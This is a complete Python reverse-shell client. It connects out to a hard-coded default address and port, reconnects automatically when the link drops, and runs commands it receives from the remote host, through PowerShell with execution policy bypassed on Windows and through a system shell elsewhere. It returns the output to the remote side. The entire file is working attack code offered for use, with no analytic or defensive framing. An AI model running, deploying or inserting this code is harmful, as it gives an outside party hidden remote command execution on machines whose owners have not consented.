import os
import sys
import time
import socket
import argparse
import subprocess
import threading
import shutil


def parse_address():
    parser = argparse.ArgumentParser(description="Reverse shell client")
    parser.add_argument('-a', '--address', default='10.122.70.210', help='IP address to connect to')
    parser.add_argument('-p', '--port', type=int, default=9999, help='Port to connect to')
    args = parser.parse_args()
    return args.address, args.port


def keep_alive(conn):
    while True:
        try:
            conn.send(b'\x00')
        except Exception:
            conn.close()
            connect()
            break
        time.sleep(1)


def shell(conn):
    threading.Thread(target=keep_alive, args=(conn,), daemon=True).start()

    while True:
        try:
            path = os.getcwd()
            conn.sendall((path + "> ").encode())

            cmd = b''
            while not cmd.endswith(b'\n'):
                part = conn.recv(1024)
                if not part:
                    raise Exception("Connection closed")
                cmd += part

            cmd = cmd.decode().strip()
            if not cmd:
                continue

            args = cmd.split()

            if args[0] == "cd":
                if len(args) == 1:
                    os.chdir(os.path.expanduser("~"))
                else:
                    try:
                        os.chdir(args[1])
                    except Exception as e:
                        conn.sendall(f"cd error: {e}\n".encode())

            elif args[0] == "exit":
                conn.close()
                sys.exit(0)

            elif args[0] == "help":
                conn.sendall(b"exit : exit terminal\n")

            else:
                if os.name == 'nt':
                    # Use PowerShell or PowerShell Core (if available)
                    powershell_exe = shutil.which("pwsh") or "powershell.exe"
                    result = subprocess.run(
                        [powershell_exe, "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd],
                        capture_output=True,
                        text=True
                    )
                else:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

                output = result.stdout + result.stderr
                if not output:
                    output = "[+] Command executed, but no output.\n"
                conn.sendall(output.encode())

        except Exception as e:
            conn.sendall(f"\n[!] Error: {e}\n".encode())
            conn.close()
            connect()
            break


def connect():
    ip, port = parse_address()
    while True:
        try:
            s = socket.create_connection((ip, port))
            shell(s)
            break
        except Exception:
            time.sleep(1)


if __name__ == "__main__":
    connect()
